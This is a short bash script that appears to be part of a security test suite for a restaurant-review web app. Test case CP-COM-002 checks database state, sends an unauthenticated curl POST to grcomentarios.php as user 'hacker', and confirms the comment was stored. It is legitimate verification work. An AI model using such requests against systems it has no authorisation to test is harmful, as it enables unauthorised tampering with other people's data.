#!/usr/bin/env bash
# CP-COM-002: endpoint de comentarios accesible sin autenticacion
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/00_common.sh"
OUT="$DIR/../resultados/raw_CP-COM-002.txt"

{
  echo "=== CP-COM-002: acceso sin autenticacion a grcomentarios.php ==="
  echo "--- Estado previo en BD (ultimos comentarios) ---"
  mysql_cli -e "SELECT Id, usuario, comentario, id_restaurante FROM comentarios ORDER BY Id DESC LIMIT 3;"
  echo
  echo "--- Request SIN cookie de sesion ---"
  echo "POST /grcomentarios.php  usuario=hacker&comentario=Comentario sin autenticacion"
  curl -s -i -X POST "$BASE_URL/grcomentarios.php" \
    --data-urlencode "usuario=hacker" \
    --data-urlencode "comentario=Comentario sin autenticacion"
  echo
  echo "--- Estado posterior en BD: se busca el registro insertado por 'hacker' ---"
  mysql_cli -e "SELECT Id, usuario, comentario, id_restaurante FROM comentarios WHERE usuario='hacker' ORDER BY Id DESC LIMIT 3;"
} | tee "$OUT"
